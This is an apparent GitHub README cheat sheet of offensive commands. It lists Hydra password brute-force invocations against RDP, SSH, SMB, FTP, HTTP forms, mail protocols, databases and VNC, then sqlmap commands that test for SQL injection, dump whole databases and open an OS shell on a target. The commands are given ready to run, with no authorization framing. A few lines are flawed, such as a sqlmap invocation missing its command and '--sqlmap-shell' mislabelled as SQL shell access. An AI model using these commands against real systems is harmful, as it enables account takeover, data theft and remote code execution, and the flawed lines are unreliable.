# hack-Cheat-Sheets
This repo has a collection of snippets of codes and commands to help our lives! The main purpose is not be a crutch, this is a way to do not waste our precious time.


## Resources
i find these Repos very userfull 
- [Kali linux cheat sheet](https://github.com/NoorQureshi/kali-linux-cheatsheet)
- [Pentesting Tactics](https://hackviser.com/tactics/pentesting)
- [Windows Registry Attacks Cheat Sheet](https://infoseclabs.io/wp-content/uploads/simple-file-list/Windows-Registry-Attacks-Cheat-Sheet.pdf)

---
## Ninja Table
1. [Hydra cheat sheet](#1-Hydra-Cheat-Sheet)
2. [SQLmap Cheat sheet](#2-SQLmap-cheat-sheet)


---




## 1. Hydra Cheat Sheet


## RDP
```bash
hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V
```

## SSH

```bash
hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V
```

## SMB

```bash
hydra -l Administrator -P passwords.txt -f smb://10.0.2.5 -V
```

## FTP

```bash
hydra -l root -P passwords.txt -f ftp://10.0.2.5 -V
```

## HTTP Basic Auth

```bash
hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V
```

## HTTP POST

```bash
hydra -L users.txt -P password.txt 10.0.2.5 http-post-form \
"/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
```

## IMAP

```bash
hydra -l root -P passwords.txt -f imap://10.0.2.5 -V
```

## MySQL

```bash
hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -V
```

## POP3

```bash
hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V
```

## Redis

```bash
hydra -P password.txt redis://10.0.2.5 -V
```

## Rexec

```bash
hydra -l root -P password.txt rexec://10.0.2.5 -V
```

## Rlogin

```bash
hydra -l root -P password.txt rlogin://10.0.2.5 -V
```

## RSH

```bash
hydra -L username.txt rsh://10.0.2.5 -V
```

## RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

## SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V  # Port 587 for SMTP with SSL
```

## Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
```

## VNC

```bash
hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt -s <PORT> <IP> vnc
```


## 2. SQLmap cheat sheet

### Installation 

    sudo apt install sqlmap

### Automatic Analysis

    sqlmap -u “https://target.com/page/”

> Use this method to get basic info if that particular page is vulnerable or not, Note its not always reliable


### Specifying the GET Request Parameter

    sqlmap -u “https://target.com/page?para1=val1&para2=val2”

> Use this when you are sure that when the website accepts that particular parameter

### Asking SQL map to Check if particular parameter is exploitable

    “https://target_site.com/page?p1=value1&p2=value2” -p p1

> Here P1 is the first parameter and using that -p followed by p1 asks SQLmap to check that particular parameter alone.


### Specifying the POST Request Parameter

    sqlmap -u “https://target.com/page/” --data="p1=val1&p2=val2"

> This is very important since lot of web apps use POST request instead of GET request

### When a web app uses Authenticated Session With Cookie or Header

    sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --cookie="Session_Cookie_Value"

> Get the Cookie Session for the browser's developer tools in the application section


    sqlmap -u “https://target_site.com/page/” --data="p1=val1&p2=val2" --headers="<------>"

##  Once you success fully exploit there is session thats created by SQLmap which you can use for direct connection

    sqlmap -u “https://target.com/page?p1=value1" -s SESSION-FILE.sqlite --dbs

> You can use this file from the home path of the SQLMap tool’s output directory.


## Exploitation Commands

If the SQL injection vulnerability is observed **positive** then you can use the following commands to Exploit the SQL injection vulnerability.

### List the databases

    sqlmap -u “https://target_site.com/page?p1=value1” --dbs

### List Tables of a particular Database

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --tables

### List Columns of Table of a Database 

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --columns

### Dump Specific Data of Columns of Table  of Database 

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump

### Fully Dump Table TARGET_TABLE of Database TARGET_DB

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --dump

### Dump full Database

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --dump

### Run Custom Query on your own

    sqlmap -u “https://target_site.com/page?p1=value1” --sql-query "SELECT * FROM TARGET_DB;"

### Get  access to OS Shell

    sqlmap -u “https://target_site.com/page?p1=value1” --os-shell

### Get access to SQL shell

    sqlmap -u “https://target_site.com/page?p1=value1” --sqlmap-shell






